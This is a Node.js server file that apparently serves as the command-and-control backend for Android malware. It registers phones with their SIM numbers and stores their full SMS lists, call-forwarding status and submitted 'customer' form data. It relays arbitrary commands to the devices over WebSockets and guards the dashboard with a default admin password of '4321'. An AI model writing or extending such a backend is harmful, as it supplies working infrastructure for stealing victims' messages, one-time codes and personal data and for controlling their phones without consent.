try {
    require('dotenv').config();
} catch (err) {    console.warn('⚠️ dotenv not installed — skipping .env load');
}
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// Request timeout middleware
app.use((req, res, next) => {
    req.setTimeout(30000);
    res.setTimeout(30000);
    next();
});

// ========== MONGODB CONNECTION ==========
const MONGO_URI = process.env.MONGO_URI;
mongoose.set('bufferCommands', false);

if (!MONGO_URI) {
    console.error('❌ MONGO_URI is not set.');
    process.exit(1);
}

mongoose.connect(MONGO_URI, {
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000,
    connectTimeoutMS: 10000,
    maxPoolSize: 10,
    minPoolSize: 5
}).then(() => console.log("✅ MongoDB Connected Successfully!"))
  .catch((err) => {
      console.error('❌ MongoDB Connection Error:', err);
      process.exit(1);
  });

mongoose.connection.on('disconnected', () => console.log('⚠️ MongoDB disconnected'));
mongoose.connection.on('error', (err) => console.error('❌ MongoDB connection error:', err));

// ========== DEVICE SCHEMA ==========
const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, index: true, unique: true },
    serialNumber: { type: String, index: true },
    model: String,
    androidVersion: String,
    sim1: String,
    sim2: String,
    battery: Number,
    isOnline: { type: Boolean, default: false, index: true },
    lastSeen: { type: Date, default: Date.now, index: true },
    isPinned: { type: Boolean, default: false },
    registrationTimestamp: { type: Date, default: Date.now },
    customerData: { type: mongoose.Schema.Types.Mixed, default: {} },
    isDeleted: { type: Boolean, default: false, index: true },
    smsMessages: { type: Array, default: [] }
});

deviceSchema.index({ isOnline: 1, lastSeen: -1 });
const Device = mongoose.model('Device', deviceSchema);

// ========== HTTP SERVER & WEBSOCKETS ==========
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (req, socket, head) => {
    if (req.url && req.url.startsWith('/socket.io')) {
        // Let Socket.IO handle its own upgrades
    } else {
        wss.handleUpgrade(req, socket, head, (ws) => {
            wss.emit('connection', ws, req);
        });
    }
});

global.io = io;
global.deviceSockets = new Map();
let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// ========== API ROUTES ==========
app.post('/device/register', async (req, res) => {
    try {
        const d = req.body;
        if (!d.deviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });

        const update = {
            $set: { ...d, isOnline: true, lastSeen: new Date() },
            $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false }
        };
        
        const device = await Device.findOneAndUpdate({ deviceId: d.deviceId }, update, { upsert: true, new: true });
        
        setImmediate(() => io.emit('dashboard-update'));
        res.status(200).json({ success: true, message: 'Device registered', deviceId: device.deviceId });
    } catch (error) {
        console.error('❌ device/register error', error.message);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find({ isDeleted: { $ne: true } }).lean();
        const now = Date.now();
        devices.forEach(d => {
            if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 70000) { // 70s threshold
                d.isOnline = false;
            }
        });
        res.json(devices);
    } catch (err) {
        res.status(500).json({ error: "Failed to fetch devices" });
    }
});

app.post('/api/command', async (req, res) => {
    const { deviceId, action, data } = req.body;
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing fields' });

    const clients = global.deviceSockets.get(deviceId);
    if (!clients || clients.size === 0) {
        return res.status(404).json({ success: false, message: 'Device not connected' });
    }

    let sentCount = 0;
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ command: action, deviceId, data }));
            sentCount++;
        }
    });

    if (sentCount > 0) {
        res.json({ success: true, message: `Command '${action}' sent to ${sentCount} client(s).` });
    } else {
        res.status(404).json({ success: false, message: 'Device not connected (no open sockets)' });
    }
});

// Other placeholder routes
app.post('/api/login', (req, res) => {
    if (req.body.username === "admin" && req.body.password === adminPassword) res.json({ success: true });
    else res.status(401).json({ success: false });
});
// Add other routes like delete, pin etc. here

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ========== WEBSOCKET HANDLERS ==========
wss.on('connection', (ws, req) => {
    const deviceIdHeader = req.headers['device-id'];
    console.log(`[WS] Connection from ${req.socket.remoteAddress}, Device-ID: ${deviceIdHeader}`);
    let deviceId = deviceIdHeader; // Assume deviceId from header initially

    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    if (deviceId) {
        if (!global.deviceSockets.has(deviceId)) {
            global.deviceSockets.set(deviceId, new Set());
        }
        global.deviceSockets.get(deviceId).add(ws);
        
        Device.findOneAndUpdate({ deviceId }, { $set: { isOnline: true, lastSeen: new Date() } }, { upsert: true, new: true })
            .then(() => setImmediate(() => io.emit('dashboard-update')))
            .catch(err => console.error(`[DB] Error on WS connect for ${deviceId}:`, err));
    }
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message.toString());
            console.log(`[WS] Message from ${data.deviceId || deviceId}:`, data.type);
            const currentDeviceId = data.deviceId || deviceId;

            if (!currentDeviceId) return;

            // Handle specific data types from device
            switch (data.type) {
                case 'SMS_LIST':
                    if (Array.isArray(data.messages)) {
                        await Device.updateOne({ deviceId: currentDeviceId }, { $set: { smsMessages: data.messages } });
                        io.emit('sms-list-update', { deviceId: currentDeviceId, messages: data.messages });
                    }
                    break;
                case 'CALL_FORWARD_STATUS_RESULT':
                    if (data.status) {
                        io.emit('call-forward-status-update', { deviceId: currentDeviceId, status: data.status });
                    }
                    break;
                case 'FORM_SUBMIT':
                    if (data.data) {
                        await Device.updateOne({ deviceId: currentDeviceId }, { $set: { customerData: data.data } });
                        setImmediate(() => io.emit('dashboard-update'));
                    }
                    break;
                case 'DEVICE_DATA': // Generic device data update
                     await Device.updateOne({ deviceId: currentDeviceId }, { $set: { ...data, lastSeen: new Date(), isOnline: true } });
                     setImmediate(() => io.emit('dashboard-update'));
                    break;
            }
        } catch (err) {
            console.error(`[WS] Message processing error:`, err.message);
        }
    });

    ws.on('close', (code, reason) => {
        console.log(`[WS] Disconnected (deviceId: ${deviceId}) code=${code} reason=${String(reason)}`);
        if (deviceId) {
            const clients = global.deviceSockets.get(deviceId);
            if (clients) {
                clients.delete(ws);
                if (clients.size === 0) {
                    global.deviceSockets.delete(deviceId);
                    Device.updateOne({ deviceId }, { $set: { isOnline: false, lastSeen: new Date() } })
                        .then(() => setImmediate(() => io.emit('dashboard-update')))
                        .catch(err => console.error(`[DB] Error on WS close for ${deviceId}:`, err));
                }
            }
        }
    });
    ws.on('error', (error) => console.error(`[WS] Error (deviceId: ${deviceId}):`, error.message));
});

// Ping heartbeat
const heartbeat = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping(() => {});
    });
}, 30000);

// ========== SOCKET.IO HANDLERS ==========
io.on('connection', (socket) => {
    console.log('⚡ Dashboard connected:', socket.id);
    socket.on('disconnect', () => console.log('⚡ Dashboard disconnected:', socket.id));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});